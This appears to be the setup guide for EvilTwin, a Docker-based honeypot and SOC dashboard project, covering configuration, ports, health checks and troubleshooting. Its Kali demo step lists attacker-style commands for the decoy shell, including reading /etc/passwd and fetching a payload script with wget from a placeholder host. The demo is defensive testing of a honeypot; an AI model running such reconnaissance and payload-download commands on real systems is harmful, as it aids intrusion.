---
id: running-the-project
title: Running the Project
---

This page is the single authoritative guide for getting all seven EvilTwin services running from a fresh checkout. It reflects the actual tested workflow, including known image quirks and the fixes already applied to the codebase.

---

## Prerequisites

| Tool | Minimum version | Check |
| --- | --- | --- |
| Docker Engine | 24+ | `docker --version` |
| Docker Compose | v2.x | `docker compose version` |
| `curl` | any | `curl --version` |
| `openssl` | any | `openssl version` |

No local Python or Node.js install is required — everything runs inside containers.

---

## Step 1 — Clone the repository

```bash
git clone https://github.com/Janaashraf992/EvilTwin.git
cd EvilTwin
```

---

## Step 2 — Create and configure `.env`

Copy the example file and fill in the required secrets:

```bash
cp .env.example .env
```

**Required values** — the stack will not start safely without these:

```bash
# Strong database password
POSTGRES_PASSWORD=$(openssl rand -hex 20)

# JWT signing key
SECRET_KEY=$(openssl rand -hex 32)

# Canary webhook HMAC secret
CANARY_WEBHOOK_SECRET=$(openssl rand -hex 32)
```

Write those generated values into `.env`. You can do it in one go:

```bash
sed -i \
  "s|POSTGRES_PASSWORD=.*|POSTGRES_PASSWORD=$(openssl rand -hex 20)|" \
  .env
sed -i \
  "s|SECRET_KEY=.*|SECRET_KEY=$(openssl rand -hex 32)|" \
  .env
sed -i \
  "s|CANARY_WEBHOOK_SECRET=.*|CANARY_WEBHOOK_SECRET=$(openssl rand -hex 32)|" \
  .env
```

**Optional — enable AI threat analysis:**

```bash
LLM_API_KEY=sk-...               # Leave blank to disable AI features
LLM_MODEL=gpt-4o-mini            # Default model
LLM_BASE_URL=https://api.openai.com/v1   # Default endpoint
```

For a local model via Ollama:

```bash
LLM_BASE_URL=http://host.docker.internal:11434/v1
LLM_API_KEY=ollama
LLM_MODEL=llama3
```

---

## Step 3 — Check for port conflicts

EvilTwin binds to the following host ports by default. Verify they are free:

| Port | Used by |
| --- | --- |
| `2222` | Cowrie SSH honeypot |
| `2121`, `8081`, `1445`, `11433` | Dionaea multi-protocol honeypot |
| `5432` | PostgreSQL |
| `6633`, `8080` | Ryu SDN controller |
| `8000` | FastAPI backend |
| `3000` | React frontend (vite preview) |

```bash
ss -tlnp | grep -E '2222|2121|8081|1445|11433|5432|6633|8080|8000|3000'
```

If any port is already in use, change the host-side binding in `docker-compose.yml` (e.g. `"2223:2222"`).

:::warning SSH daemon conflict
If your host's SSH daemon listens on port 22, there is no conflict — Cowrie maps to port **2222**, not 22. Test with `ssh -p 2222 root@localhost`.
:::

---

## Step 4 — Build and start all services

```bash
docker compose up --build -d
```

This builds five custom images (backend, frontend, ryu, cowrie, dionaea) and pulls postgres and splunk-forwarder. First build takes 2–5 minutes depending on your internet speed.

Watch the startup progress:

```bash
docker compose logs -f --tail=30
```

After ~30 seconds, check that all seven services are up:

```bash
docker compose ps --format "table {{.Name}}\t{{.Status}}"
```

Expected output:

```text
NAME                  STATUS
eviltwin-backend      Up X minutes (healthy)
eviltwin-cowrie       Up X minutes
eviltwin-dionaea      Up X minutes
eviltwin-frontend     Up X minutes
eviltwin-postgres     Up X minutes (healthy)
eviltwin-ryu          Up X minutes
eviltwin-splunk-fwd   Up X minutes (healthy)
```

:::tip Confirming the backend is on both networks
The backend must be on both `eviltwin-net` (for frontend/ryu) and `deception-net` (for honeypots). Verify with:

```bash
docker inspect eviltwin-backend \
  --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}} {{end}}'
# Expected: deception-net eviltwin-net
```

:::

---

## Step 5 — Confirm automatic backend bootstrap

The backend container now handles its own startup bootstrap. During container start it will:

- train a replacement ML model when `MODEL_PATH` is missing
- run `alembic upgrade head`
- reset stale Alembic revision state and rerun migrations if the revision table exists but the core application tables are missing
- seed the demo analyst account when `DEMO_BOOTSTRAP=true`

Check the backend logs to confirm startup completed cleanly:

```bash
docker compose logs backend --tail=40
```

If you need to rerun the schema manually after a change, this command is still safe and idempotent:

```bash
docker compose exec backend alembic upgrade head
```

---

## Step 6 — Verify service health

```bash
# Backend health check
curl -s http://localhost:8000/health | python3 -m json.tool
```

```json
{
  "status": "healthy",
  "database": true,
  "model": true,
  "uptime": 45
}
```

```bash
# Cowrie — should accept the connection (use any password)
ssh -p 2222 -o StrictHostKeyChecking=no root@localhost
# Type 'exit' to leave

# Dionaea HTTP
curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/
# Returns 200 or 302

# Ryu REST API
curl -s http://localhost:8080/stats/switches | python3 -m json.tool
```

---

## Step 7 — Use the seeded demo analyst or register another account

The default compose file seeds a ready-to-use analyst account:

```bash
export DEMO_EMAIL=analyst@eviltwin.local
export DEMO_PASSWORD=eviltwin-demo
```

Log in with the real backend auth flow, which expects form data instead of JSON:

```bash
curl -s -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=${DEMO_EMAIL}" \
  --data-urlencode "password=${DEMO_PASSWORD}" \
  | python3 -m json.tool
```

If you want a separate analyst account, register it with JSON first:

```bash
curl -s -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "operator@eviltwin.local", "password": "SecurePass123!"}' \
  | python3 -m json.tool
```

Save the `access_token` from the login response for later API calls.

---

## Step 8 — Open the SOC Dashboard

Navigate to [http://localhost:3000](http://localhost:3000) and log in with the seeded demo analyst or the account you registered.

You will see:

- Live threat feed (populated as honeypots receive connections)
- Session browser with filtering
- Global attack map
- Alert notifications pushed over WebSocket

---

## Step 9 — Run the Kali demo

For the exact end-to-end demo procedure, use [Kali Demo Walkthrough](./kali-demo-walkthrough.md). The short version is:

```bash
# Connect from Kali to the Cowrie SSH honeypot
ssh -p 2222 -o StrictHostKeyChecking=no root@<DOCKER_HOST_IP>

# Once inside the fake shell, run some attacker-style commands:
whoami
id
cat /etc/passwd
uname -a
wget http://example.com/payload.sh
exit
```

Back in the dashboard you should see within a few seconds:

- A new session entry in the Sessions page
- A computed threat score from the ML model
- An alert if the score meets the `THREAT_REDIRECT_THRESHOLD`

Query directly with the saved token:

```bash
TOKEN="your_access_token_here"

# List sessions
curl -s "http://localhost:8000/sessions?page=1&page_size=5" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Score an IP
curl -s "http://localhost:8000/score/127.0.0.1" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

## Step 10 — AI analysis (optional)

If `LLM_API_KEY` is set, you can ask the AI to explain any session:

```bash
SESSION_ID="uuid-from-the-sessions-list"

curl -s -X POST http://localhost:8000/ai/analyze \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"session_id\": \"$SESSION_ID\"}" \
  | python3 -m json.tool
```

Or ask a free-form question:

```bash
curl -s -X POST http://localhost:8000/ai/chat \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message": "What MITRE ATT&CK techniques does running wget right after SSH login indicate?"}' \
  | python3 -m json.tool
```

---

## Stopping and restarting

```bash
# Stop all services (preserves data volumes)
docker compose down

# Stop and wipe all data (database, logs, captures)
docker compose down -v

# Restart a single service
docker compose restart backend

# Rebuild and restart one service after a code change
docker compose up --build -d backend
```

---

## Troubleshooting known issues

### Ryu crashes immediately (setuptools error)

**Symptom:** `AttributeError: module 'setuptools.command.easy_install' has no attribute 'get_script_args'`

**Cause:** `ryu==4.34` uses a `setup.py` hook that breaks with setuptools ≥ 58.

**Fix (already applied):** The `sdn/Dockerfile` pins `pip install "setuptools<58"` before installing ryu. If you see this error, rebuild:

```bash
docker compose build --no-cache ryu
docker compose up -d --no-build ryu
```

---

### Cowrie fails to start (`/bin/sh: no such file or directory`)

**Symptom:** Build fails with `exec: "/bin/sh": stat /bin/sh: no such file or directory`

**Cause:** The `cowrie/cowrie:latest` base image has no `/bin/sh` at the expected path — Docker `RUN` commands are impossible.

**Fix (already applied):** The `honeypots/cowrie/Dockerfile` has zero `RUN` instructions. Only `COPY` and `CMD` are used. If you add a `RUN` to that Dockerfile it will break the build.

---

### Dionaea segfaults (exit code 139)

**Symptom:** `eviltwin-dionaea` keeps restarting with exit code 139.

**Cause:** Two issues in combination:

1. Old-style Python module imports in `dionaea.cfg` (pre-2017 API)
2. Docker named volume mounts at `var/lib/dionaea/binaries` prevent the entrypoint's `init_lib` from running, leaving required subdirectories missing

**Fix (already applied):** The cfg uses the new-style `imports=dionaea.log,dionaea.services,dionaea.ihandlers` API, and the Dockerfile runs `cp -a template/lib var/` to pre-populate the directory structure. If dionaea restarts with 139, check whether the cfg has been accidentally reverted to old-style imports.

---

### Frontend build fails (TypeScript test errors)

**Symptom:** Docker build of the frontend fails with `Cannot find name 'describe'` / `Cannot find name 'expect'`

**Cause:** Test files (`*.test.tsx`) are compiled by `tsc -b` during `npm run build` but test globals are not available in the main tsconfig.

**Fix (already applied):** `frontend/tsconfig.json` has an `exclude` array that drops all `*.test.ts(x)` and `src/test` paths from the main compilation. If you add new test files outside `src/test`, follow the same naming pattern.

---

### Backend unreachable from honeypots

**Symptom:** Cowrie/Dionaea event POSTs time out or are refused.

**Cause:** Honeypots live on `deception-net` (an `internal: true` network with no internet access). If the backend is only attached to `eviltwin-net`, it is unreachable from honeypots.

**Fix (already applied):** The backend service in `docker-compose.yml` is attached to both `eviltwin-net` and `deception-net`. Verify:

```bash
docker inspect eviltwin-backend \
  --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}} {{end}}'
# Must show: deception-net eviltwin-net
```

---

## Service reference

| Service | Image | Ports | Purpose |
| --- | --- | --- | --- |
| `postgres` | `postgres:16-alpine` | 5432 | Primary database |
| `backend` | custom `python:3.11-slim` | 8000 | FastAPI + ML scoring engine |
| `frontend` | custom `node:20-alpine` | 3000 | React SOC dashboard |
| `ryu` | custom `python:3.11-slim` | 6633, 8080 | OpenFlow SDN controller |
| `cowrie` | `cowrie/cowrie:latest` | 2222 | SSH honeypot |
| `dionaea` | `dinotools/dionaea:latest` | 2121, 8081, 1445, 11433 | Multi-protocol honeypot |
| `splunk-forwarder` | `splunk/universalforwarder` | — | SIEM log forwarding |

---

## What's next

| Goal | Go here |
| --- | --- |
| Understand the architecture | [System Overview](./master-guide.md) |
| Deploy to production with TLS | [Operations and Deployment](./operations-and-deployment.md) |
| Respond to a live alert | [Incident Response Runbook](./incident-response-runbook.md) |
| Explore the full REST API | [API Reference](/dev/api-reference) |
| Debug an unexpected problem | [Troubleshooting](./troubleshooting.md) |
